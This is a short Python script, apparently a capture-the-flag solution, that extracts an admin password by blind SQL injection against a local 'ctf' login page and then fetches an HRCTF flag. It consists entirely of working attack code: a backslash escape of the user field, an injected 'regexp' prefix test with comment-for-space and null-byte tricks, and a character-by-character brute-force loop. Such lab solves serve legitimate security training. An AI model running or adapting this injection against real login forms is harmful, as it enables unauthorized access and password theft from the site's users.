import string
import requests
import re
char_set = '0123456789abcdefghijklmnopqrstuvwxyz_'
pw = ''
while 1:
    for ch in char_set:
        url = 'http://localhost/ctf/?user=\\&pwd=||pwd/**/regexp/**/"^%s";%%00'
        r = requests.get(url=url%(pw+ch))
        if 'Welcome Admin' in r.text:
            pw += ch
            print(pw)
            break
    if ch == '_': break
r = requests.get('http://localhost/ctf/?user=&pwd=%s' % pw)
print(re.findall('HRCTF{\S{1,50}}',r.text)[0])
